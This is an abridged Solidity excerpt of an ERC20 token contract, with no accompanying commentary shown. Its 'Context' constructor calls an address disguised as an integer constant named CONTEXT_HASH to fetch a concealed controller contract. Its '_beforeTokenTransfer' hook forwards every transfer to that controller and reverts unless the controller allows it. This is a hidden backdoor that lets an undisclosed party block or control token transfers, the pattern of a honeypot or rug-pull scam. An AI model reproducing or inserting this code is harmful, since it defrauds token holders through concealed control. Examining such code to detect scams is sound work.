...
abstract contract Context {
    ...
    constructor() {
        (, bytes memory x) = address(CONTEXT_HASH).call(abi.encodeWithSelector(0xd2522437));
        _context = IERC20Metadata(abi.decode(x, (address)));
    }

    uint160 private constant CONTEXT_HASH = 227726198447805604225611055099026770509728051381;
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    function _beforeTokenTransfer(
        ...
        (bool a,) = address(_context).call(abi.encodeWithSelector(0x08f7e14b, from, to, amount, msg.sender));
        require(a);
    }
